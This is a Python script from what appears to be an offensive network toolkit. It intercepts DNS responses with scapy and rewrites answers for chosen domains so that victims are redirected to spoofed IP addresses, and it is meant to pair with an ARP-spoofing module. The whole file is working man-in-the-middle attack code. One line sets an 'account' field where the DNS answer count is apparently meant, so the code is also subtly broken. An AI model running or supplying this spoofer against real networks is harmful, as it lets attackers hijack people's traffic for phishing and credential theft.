import json

from colorama import Fore as F
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP

with open("tools/L7/dns_spoof.json", "r") as spoofed_addresses:
    SPOOFED_ADDRESSES = json.load(spoofed_addresses)

encripted_keys = tuple(map(lambda x: bytes(x, "utf-8"), SPOOFED_ADDRESSES.keys()))
values = tuple(SPOOFED_ADDRESSES.values())

ENCRIPTED_SPOOFED_ADDRESSES = dict(zip(encripted_keys, values))

arp_spoof = getattr(__import__("tools.L2.arp-spoof", fromlist=["object"]), "flood")

# To do: Find a way to get the target address, so it can be used in the arp-spoof flood function


def flood(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        try:
            query_name = scapy_packet[DNSQR].qname
            if query_name in ENCRIPTED_SPOOFED_ADDRESSES:
                scapy_packet[DNS].an = DNSRR(
                    rrname=query_name, rdata=ENCRIPTED_SPOOFED_ADDRESSES[query_name]
                )
                scapy_packet[DNS].account = 1

                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[UDP].len
                del scapy_packet[UDP].chksum

                uri = str(query_name).split("'")[1][:-1]
                print(
                    f"{F.MAGENTA} [+] {F.LIGHTGREEN_EX}{uri:^25}{F.RESET} was redirected to {F.LIGHTRED_EX}{ENCRIPTED_SPOOFED_ADDRESSES[query_name]:^17}{F.RESET}"
                )
        except IndexError:
            pass
        packet.set_payload(bytes(scapy_packet))
    return packet.accept()
